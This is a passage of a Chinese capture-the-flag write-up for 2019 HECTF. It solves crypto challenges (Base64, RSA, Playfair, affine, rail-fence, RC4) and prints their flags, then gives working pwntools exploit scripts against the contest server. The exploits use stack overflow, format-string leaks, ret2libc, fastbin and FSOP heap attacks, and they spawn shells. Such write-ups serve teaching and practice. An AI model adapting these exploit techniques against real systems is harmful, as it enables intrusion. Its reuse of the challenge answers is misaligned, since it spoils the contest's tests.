                <a rel=2019HECTF wp href="./43.png" title="图片" data-fancybox="images"><img src="./43.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>第三段flag在老鼠后面</p>
<h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><figure class="image-box">
                <a rel=2019HECTF wp href="./44.png" title="图片" data-fancybox="images"><img src="./44.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>包裹上题目的flag格式提交</p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="妈妈我想玩Base64"><a href="#妈妈我想玩Base64" class="headerlink" title="妈妈我想玩Base64"></a>妈妈我想玩Base64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">Str=str(base64.b64decode(f.read()),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="string">'''while Str not in 'flag':</span></span><br><span class="line"><span class="string">    Str=str(base64.b64decode(Str),encoding='utf-8')</span></span><br><span class="line"><span class="string">    print(str(i)+'\n')</span></span><br><span class="line"><span class="string">    i=i+1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">    Str=str(base64.b64decode(Str),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    print(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">print(Str)</span><br><span class="line">print(<span class="string">"GG"</span>)</span><br></pre></td></tr></table></figure>
<p>通过while循环发现base64解密后50次报错 ，用for循环49次，<br>flag{c03781ba-81e9-48a6-afa4-037ee75c8428}</p>
<p>GG</p>
<h2 id="SCP-log"><a href="#SCP-log" class="headerlink" title="SCP_log"></a>SCP_log</h2><p>下载好文档打开后里面有几串字母和数字的等式。</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./45.png" title="图片" data-fancybox="images"><img src="./45.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>经搜索得知是RSA加密，而且这道题恰好给出了RSA加密几个关键的数值.(素数对的乘积n,以及指数e) 这里要弄懂以下函数表达的意义↓.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./46.png" title="图片" data-fancybox="images"><img src="./46.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p> 故开始进行解题.</p>
<p>1.对n进行分解</p>
<p>选择<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a>对n分解,查看是否储存有已经分解成功的N值.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./47.png" title="图片" data-fancybox="images"><img src="./47.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=2019HECTF wp href="./48.png" title="图片" data-fancybox="images"><img src="./48.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>成功将n值分解为p和q.</p>
<p>2.计算d值.</p>
<p>因为得到的p,q,e数值较大.所以从网上找到脚本计算d值.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./49.png" title="图片" data-fancybox="images"><img src="./49.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>得到两个d值分别为221840096952962289314707891263857576041和33580702939028137216163981439176632233038140452498081226430421384805976218945</p>
<p>3.最后用算出的d与网上的脚本将密文c进行解密.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./50.png" title="图片" data-fancybox="images"><img src="./50.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=2019HECTF wp href="./51.png" title="图片" data-fancybox="images"><img src="./51.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>4.将明文进行组合,得到flag为flag{1721f85a-85ed-4769-8faa-4e15baaaa853}</p>
<h2 id="啥玩意啊"><a href="#啥玩意啊" class="headerlink" title="啥玩意啊"></a>啥玩意啊</h2><p>题目描述为: flag由3部分组成:hebctf{flag1-flag2-flag3}</p>
<p>1.flag1由5个字符组成，sha1加密后：8af093ec12abbd25a82abd6d5ed8080afbbfa098</p>
<p>前3个字符为：odm 第4个字符是个小写字符，最后一个是个数字。</p>
<p> 解:根据描述知flag1前三位是odm, 经过 猜测 第四位小写字母为s，最后一个数字为1，因此猜测flag1为odms1，经过sha1加密后与描述匹配，确认flag1无误。(真的是猜出来的..)</p>
<p>2.flag2:playfair加密(有意义的单词)     密文为 kb ky hs   密钥为 flag1去掉数字。</p>
<p> 解: 通过flag1将密钥补全并填充字母写成5x5矩形.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./52.png" title="图片" data-fancybox="images"><img src="./52.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>3.仿射加密 </p>
<p>key1:它是第3个合格的仿射加密key1(那仿射密码对key1有什么要求？)</p>
<p>key2:凯撒密码向后移几位它就是几</p>
<p>密文：srpnv </p>
<p>解: 仿射密码是将26个字母换成数字,并进行对应数学运算进行加密的加密方式. </p>
<pre><code>key1讲是第三个合格的仿射加密,即为第三个与26互素的数字,故key1为5 。

key2是凯撒密码向后移动的位数, 通常凯撒密码移动的位数为3,故key2为3。

则我们可以根据解密函数 {% image https://uploader.shimo.im/f/qQ4UiWl4xMsZGHnH.png!thumbnail '图片' '' %}

构建对应表格。
</code></pre><figure class="image-box">
                <a rel=2019HECTF wp href="./53.png" title="图片" data-fancybox="images"><img src="./53.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>[注释:key1为a的数值，key2为b的数值，m为英文字母总数26，</p>
<p>a^(-1)应满足<figure class="image-box">
                <a rel=2019HECTF wp href="./54.png" title="图片" data-fancybox="images"><img src="./54.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>，故带入5求得对应数值为21]</p>
<p>故flag3为disco</p>
<p>将3个flag合并得到最终答案 hebctf{odms1-helxlo-disco} ,这里应注意,提交答案时应将helxlo中的x去掉,才是正确答案。</p>
<h2 id="书页要分栏"><a href="#书页要分栏" class="headerlink" title="书页要分栏"></a>书页要分栏</h2><p>小兰听说要给书页分栏，可是明明这本书只有5页欸！</p>
<p>解:</p>
<p>将栅栏密码密文 SWDY=zdEAFwVRWlD3RnVUfcFSVDVMTJCyM0VUfNESBl= 解密5次</p>
<p>得到Base64加密密文 SEVCVFVDVEYlN0JDcnlwdDBfMTVfRWFzWSUyMSU3RA==</p>
<p>解密得到 HEBTUCTF%7BCrypt0_15_EasY%21%7D </p>
<p>将其中的 %7B %21 %7D 与ASCII表对应，得出符号为{ ! }</p>
<p>所以flag应为 HEBTUCTF{Crypt0_15_EasY!}</p>
<h2 id="蓝精灵"><a href="#蓝精灵" class="headerlink" title="蓝精灵"></a>蓝精灵</h2><p>希尔密码</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./55.png" title="图片" data-fancybox="images"><img src="./55.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="so-easy"><a href="#so-easy" class="headerlink" title="so_easy"></a>so_easy</h2><p>下载后发现是关于RSA算法，百度一下，<br><figure class="image-box">
                <a rel=2019HECTF wp href="./56.png" title="图片" data-fancybox="images"><img src="./56.png" alt="图片" title class></a>
                <p>图片</p>
            </figure></p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./57.png" title="图片" data-fancybox="images"><img src="./57.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=2019HECTF wp href="./58.png" title="图片" data-fancybox="images"><img src="./58.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一步：随机两个质数p、q</span><br><span class="line"></span><br><span class="line">第二步：计算n即欧拉函数**n = P * Q，P 与 Q 均为质数，则 φ(n) = φ(P * Q)= φ(P - 1)*φ(Q - 1) = (P - 1)*(Q - 1)  记为m</span><br><span class="line"></span><br><span class="line">第三步：随机选择一个e，条件：1&lt;e&lt;m,e与m互质</span><br><span class="line"></span><br><span class="line">不能选择 φ(n)，这样公钥和私钥就相同了。</span><br><span class="line"></span><br><span class="line">第四步：有一个整数d，使得e*d除以m的余数为1</span><br><span class="line"></span><br><span class="line">不同的e能够生成不同的d，因此可以生成多个密钥对。</span><br><span class="line"></span><br><span class="line">这里不知道e，百度了好久CTFRSA算法，有挺多ctf题都有RSA算法，许多密码学题中的RSA算法，</span><br></pre></td></tr></table></figure>
<p>里面提到<figure class="image-box">
                <a rel=2019HECTF wp href="./59.png" title="图片" data-fancybox="images"><img src="./59.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>，e=65537，得到私钥d。</p>
<p>hebtu{4f7b3c45-ab9f-4ab4-a79e}</p>
<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">9</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];     <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">8</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">8</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];      <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">8</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">8</span>] = &#123; <span class="number">7</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="comment">////char key[256] = &#123; "justfortest" &#125;;</span></span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">"kfggtb&#125;thiu[jtXU@2Xeu&#123;uu|"</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">////printf("pData=%s\n", pData);</span></span><br><span class="line">    <span class="comment">////printf("key=%s,length=%d\n\n", key, strlen(key));</span></span><br><span class="line">    <span class="comment">////rc4_init(s, (unsigned char*)key, strlen(key)); //已经完成了初始化</span></span><br><span class="line">    <span class="comment">////printf("完成对S[i]的初始化，如下：\n\n");</span></span><br><span class="line">    <span class="comment">////for (i = 0; i &lt; 256; i++)</span></span><br><span class="line">    <span class="comment">////&#123;</span></span><br><span class="line">    <span class="comment">////    printf("%02X", s[i]);</span></span><br><span class="line">    <span class="comment">////    if (i &amp;&amp; (i + 1) % 16 == 0)putchar('\n');</span></span><br><span class="line">    <span class="comment">////&#125;</span></span><br><span class="line">    <span class="comment">////printf("\n\n");</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已经加密，现在解密:\n\n"</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=2019HECTF wp href="./60.png" title="图片" data-fancybox="images"><img src="./60.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="0x01-窝窝头"><a href="#0x01-窝窝头" class="headerlink" title="0x01 窝窝头"></a>0x01 窝窝头</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./wowotou')</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10020</span>)</span><br><span class="line">p.recvuntil(<span class="string">'How much is a sorghum?'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span>+p32(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<h2 id="0x02-stackpwn2"><a href="#0x02-stackpwn2" class="headerlink" title="0x02 stackpwn2"></a>0x02 stackpwn2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./stackpwn2')</span></span><br><span class="line">p=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10000</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'checking the output system...\n'</span>,<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(<span class="number">0x000000000601018</span>)+p64(<span class="number">0x0400650</span>)+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"What you want to do?\n"</span>,payload)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">obj=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(libc_base+obj.dump(<span class="string">"str_bin_sh"</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x03-pwn-disco"><a href="#0x03-pwn-disco" class="headerlink" title="0x03 pwn_disco"></a>0x03 pwn_disco</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn_disco')</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">	p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"0"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">	p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'draw:'</span>,<span class="string">"%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7f7e0aafb830</span><span class="number">-0x7f7e0aadb000</span>)</span><br><span class="line">success(<span class="string">"libc_base===&gt;0x%x"</span>%libc_base)</span><br><span class="line">create(<span class="number">0</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">create(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+onegad[<span class="number">3</span>])+p64(libc_base+onegad[<span class="number">3</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Hard-pwn"><a href="#0x04-Hard-pwn" class="headerlink" title="0x04 Hard_pwn"></a>0x04 Hard_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">':'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./hard_pwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10026</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x1a0</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"You play is "</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x00007ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+fake_file)</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,fake_file)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
